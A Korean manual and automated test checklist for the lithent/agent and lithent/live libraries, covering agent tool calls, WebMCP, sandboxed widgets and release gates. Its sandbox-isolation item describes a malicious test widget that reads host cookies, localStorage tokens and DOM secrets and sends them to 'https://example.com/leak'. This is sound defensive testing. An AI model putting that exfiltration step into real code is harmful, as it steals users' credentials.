# MANUAL_TEST_CHECKLIST — `lithent/agent` & `lithent/live`

- 브랜치: `feat/agent-ui` / 기준 커밋 `ead8b2e`
- 작성일: 2026-11-27
- 상태: **자동 검증 완료 (Phase 8, 2026-11-28, Playwright Chromium, base·concurrent) — 사람이 직접 하는 확인과 Safari·Firefox는 미실행**
- 관련 문서: [REQUIREMENTS.md](./REQUIREMENTS.md) · [DESIGN.md](./DESIGN.md) · [IMPLEMENT.md](./IMPLEMENT.md)

## 실행 규칙

- 대상 브라우저: Chrome 최신, Safari 최신, Firefox 최신. 각 항목에 브라우저별 결과를 기록한다.
- 결과 표기: `PASS` / `FAIL` / `N/A`, 확인 날짜, 커밋 SHA, 증거(스크린샷 경로·콘솔 로그·Playwright 실행 결과).
- `FAIL` 항목이 있으면 `IMPLEMENT.md`에 이슈를 기록하고 해결 전까지 출하하지 않는다.
- `DC-10`(옵션 A, 단계적 출하 확정)에 따라 `lithent/agent` 1차 출하 시에는 `M-1`, `M-2`, `M-5`를 필수로 통과하고, `lithent/live` 2차 출하 시 `M-3`, `M-4`, `M-6`, `M-7`을 통과한다.

---

## 자동 검증 (Phase 8)

각 항목의 절차를 `e2e/agent-ui.spec.ts`가 그대로 자동화한다(`e2e/fixtures/agent-ui/`). 아래 표의 Chrome 열은 그 실행 결과(실행 규칙이 인정하는 "Playwright 실행 결과" 증거)이며, base·concurrent 두 프로젝트에서 각각 통과했다. 이 환경에는 Chromium만 설치되어 있어 Safari·Firefox 열은 비어 있다: `LITHENT_E2E_BROWSER=firefox|webkit pnpm test:e2e e2e/agent-ui.spec.ts`로 같은 검사를 돌릴 수 있다. 사람이 직접 하는 확인(DevTools 절차, 실제 Vite + React 앱)은 출하 전에 사용자가 한다.

## 항목

### M-1. 로컬 컴포넌트 양방향 조작 (`RQ-1`, `RQ-2`, `RQ-3`, `RQ-4`)

**절차**:
1. `agentAction`과 `agentState`를 선언한 주문 필터 컴포넌트를 브라우저에서 마운트한다.
2. 사람이 화면 버튼을 클릭해 필터를 변경한 뒤, DevTools 콘솔에서 `bridge.getState()`를 호출한다.
3. 콘솔에서 `await bridge.callTool('filter_orders', { status: 'delayed', minPrice: 100000 })`를 실행한다.
4. 컴포넌트를 언마운트한 뒤 `bridge.listTools()`와 `bridge.getState()`를 다시 조회한다.

**합격 기준**:
- (2) `getState()`가 사람이 클릭한 최신 상태를 JSON으로 반환한다.
- (3) `{ ok: true, ... }`가 반환되고 화면 DOM이 즉시 필터링 결과로 갱신된다.
- (4) 언마운트 후 해당 도구와 상태가 목록에서 완전히 제거된다. 콘솔 에러 0건.

| Chrome | Safari | Firefox | 커밋 | 증거 |
|---|---|---|---|---|
| PASS (자동, Chromium) — `M-1: … both change the same orders; unmounting removes its tools and state` | 미실행 | 미실행 | Phase 8 커밋 | Playwright `e2e/agent-ui.spec.ts`, base·concurrent |

---

### M-2. WebMCP 연동 및 미지원 브라우저 안전성 (`RQ-5`, `DC-4`)

**절차**:
1. WebMCP를 지원하는 브라우저(현재 Chrome은 `document.modelContext`, 이전 초안은 `navigator.modelContext`) 또는 모의 polyfill 주입 환경에서 `connectWebMCP(bridge)`를 호출한다. (`DESIGN.md` §2.6 편차 기록)
2. 컴포넌트를 마운트·언마운트하며 등록/해제된 도구 목록을 확인한다.
3. `document.modelContext`·`navigator.modelContext`가 모두 없는 브라우저(Firefox/Safari 등)에서 동일한 코드를 실행한다.

**합격 기준**:
- 지원 환경에서 마운트 시 도구가 등록되고 언마운트 시 해제되며, 도구 실행 시 화면이 갱신된다.
- 미지원 환경에서 예외나 콘솔 에러 없이 no-op으로 안전하게 동작한다.

| Chrome | Safari | Firefox | 커밋 | 증거 |
|---|---|---|---|---|
| PASS (자동, Chromium, 모의 `document.modelContext`·`navigator.modelContext`, 컨텍스트 없음) | 미실행 | 미실행 | Phase 8 커밋 | Playwright `M-2: WebMCP` 3개 테스트, base·concurrent |

---

### M-3. 양방향 Generative UI 핵심 흐름 (`RQ-6`, `RQ-8`, `DC-6`, `DC-8`)

**절차**:
1. 플레이그라운드에서 `mountLive({ mode: 'sandbox', code, container })`로 빌드 없는 `ftags` 기반 대출 계산기 위젯을 마운트한다.
2. 사용자가 위젯 안의 슬라이더/입력값을 마우스로 조작한다(예: 대출금 3억, 기간 30년).
3. 호스트 쪽에서 `handle.bridge.getState()`를 호출해 사용자 입력값을 확인한다.
4. 호스트 쪽에서 `await handle.bridge.callTool(...)`로 금리 비교 조건만 추가한다.
5. 위젯 콘텐츠 높이가 변할 때 컨테이너 높이가 자연스럽게 따라오는지 확인한다(`DC-8`).

**합격 기준**:
- 별도 빌드 단계 없이 100ms 이내(로컬 기준)에 위젯이 렌더된다.
- (3)에서 사용자가 마우스로 바꾼 `3억`, `30년` 값이 호스트에 정확히 전달된다.
- (4)에서 위젯이 처음부터 재생성되지 않고 기존 사용자 입력(`3억`, `30년`)을 유지한 채 비교 결과만 추가된다.
- 콘솔 에러 0건.

| Chrome | Safari | Firefox | 커밋 | 증거 |
|---|---|---|---|---|
| PASS (자동, Chromium, Sandbox·Direct, 시작 10~22 ms) | 미실행 | 미실행 | Phase 8 커밋 | Playwright `M-3: two-way generative UI` 3개 테스트, base·concurrent |

---

### M-4. Sandbox 보안 격리 확인 (`RQ-7`, `DC-7`)

**절차**:
1. 호스트 페이지에 `document.cookie = 'secret=1'`, `localStorage.setItem('token', 'abc')`, `<div id="host-secret">TOP_SECRET</div>`를 배치한다.
2. `mountLive({ mode: 'sandbox', code })`에 다음을 시도하는 악성 위젯 코드를 전달한다:
   - `window.parent.document.getElementById('host-secret')` 읽기
   - `window.parent.localStorage.getItem('token')` 및 `document.cookie` 읽기
   - 외부 도메인으로 `fetch('https://example.com/leak')` 전송 (기본 CSP 활성 시)
3. 호스트 페이지 DOM·저장소·네트워크 탭을 확인한다.

**합격 기준**:
- 호스트 DOM·쿠키·`localStorage` 접근이 브라우저 보안 예외로 차단된다.
- 기본 CSP 활성 시 외부 `fetch`가 차단된다.
- 호스트 앱 UI와 상태에 영향이 없으며, 구조화된 `LiveError`가 `onError`로 전달된다.

| Chrome | Safari | Firefox | 커밋 | 증거 |
|---|---|---|---|---|
| PASS (자동, Chromium, `allowNetwork` 대조·엄격한 호스트 CSP·위조 메시지 포함) | 미실행 | 미실행 | Phase 8 커밋 | Playwright `M-4` 4개 테스트, base·concurrent |

---

### M-5. 승인(`confirm`) 훅 및 오류 자가 복구 루프 (`RQ-5`, `RQ-8`, `DC-5`)

**절차**:
1. `confirm: true`가 설정된 액션에 대해 호스트 `setConfirmHandler`가 `false`를 반환하도록 설정하고 `bridge.callTool()`을 호출한다.
2. 같은 액션을 사용자가 위젯/컴포넌트 내 버튼 클릭으로 직접 실행한다(`DC-5` 정책 확인).
3. `mountLive`에 의도적 오류(예: `mounter`가 함수를 반환하지 않고 JSX/WDom을 직접 반환)가 있는 코드를 전달해 `LiveError`를 확인한 뒤, 수정된 코드로 `handle.reload(fixedCode)`를 호출한다.

**합격 기준**:
- (1) 상태가 변경되지 않고 `{ ok: false, error: { code: 'REJECTED' } }`를 반환한다.
- (2) `DC-5`(옵션 A 확정)에 따라 사람 직접 클릭 시 `confirm` 핸들러 없이 즉시 실행된다.
- (3) 오류 메시지에 수정 힌트(`hint`)가 포함되고, `reload()` 후 이전 리스너/iframe 잔재 없이 정상 동작한다.

| Chrome | Safari | Firefox | 커밋 | 증거 |
|---|---|---|---|---|
| PASS (자동, Chromium, `lithent/agent`·`lithent/live` 승인, 오류 → 수정) | 미실행 | 미실행 | Phase 8 커밋 | Playwright `M-5` 3개 테스트, base·concurrent |

---

### M-6. React 호스트 앱 안에서 `<lithent-live>` + `lithent/agent` 연동 (`RQ-4`, `RQ-8`, `DC-8`)

**절차**:
1. Vite + React 앱에서 `<lithent-live>` Custom Element를 렌더하고 `ref`로 `el.bridge`에 접근한다.
2. React 상태/버튼으로 `el.bridge.callTool(...)`을 호출하고, 위젯 내부에서 발생한 상태 변화를 `el.bridge.subscribe(...)`로 React UI에 표시한다.
3. React 조건부 렌더링으로 `<lithent-live>`를 언마운트하고 다시 마운트한다.

**합격 기준**:
- React ↔ `<lithent-live>` 양방향 상태/액션 동기화가 정상 동작한다.
- React 콘솔 경고 및 메모리 누수(detached iframe 잔존) 0건.

| Chrome | Safari | Firefox | 커밋 | 증거 |
|---|---|---|---|---|
| PASS (자동, Chromium, React 18 UMD 개발 빌드) | 미실행 | 미실행 | Phase 8 커밋 | Playwright `M-6`, base·concurrent. 실제 Vite + React 앱 확인은 미실행 |

---

### M-7. 빌드 없이 UMD CDN으로 사용 (`RQ-10`, `RQ-12`)

**절차**:
1. 빌드 도구 없는 빈 HTML 파일에 `lithent.umd.js`, `lithentHelper.umd.js`, `lithentFTags.umd.js`, `lithentAgent.umd.js`, `lithentLive.umd.js`를 `<script>` 태그로 로드한다.
2. 인라인 `<script>`에서 `lithentAgent`와 `lithentLive` 전역을 사용해 간단한 양방향 위젯을 띄우고 `callTool`을 실행한다.

**합격 기준**:
- 번들러 없이 정상 마운트 및 양방향 호출 성공. 콘솔 에러 0건.

| Chrome | Safari | Firefox | 커밋 | 증거 |
|---|---|---|---|---|
| PASS (자동, Chromium, base·concurrent 코어 UMD) | 미실행 | 미실행 | Phase 8 커밋 | Playwright `M-7`, base·concurrent |

---

## 출하 판정

- [x] `RQ-9` 코어 무수정 (`src/`, `lithentConcurrent/src/` diff 0줄) 확인 — `origin/main`(`ead8b2e`) 대비 0줄 (Phase 8)
- [x] `RQ-10` 번들 크기 예산(`pnpm size`) 통과 (Phase 8)
- [x] `RQ-11`, `RQ-12` 자동 게이트(`pnpm test:dual`, `pnpm verify:release`, `pnpm test:e2e`) 통과 (Phase 8, Chromium)
- [ ] 해당 릴리스 범위의 `M-1`~`M-7` 전 브라우저 `PASS` — Chrome은 자동 검증 PASS. 사람 확인과 Safari·Firefox가 남음 (사용자)
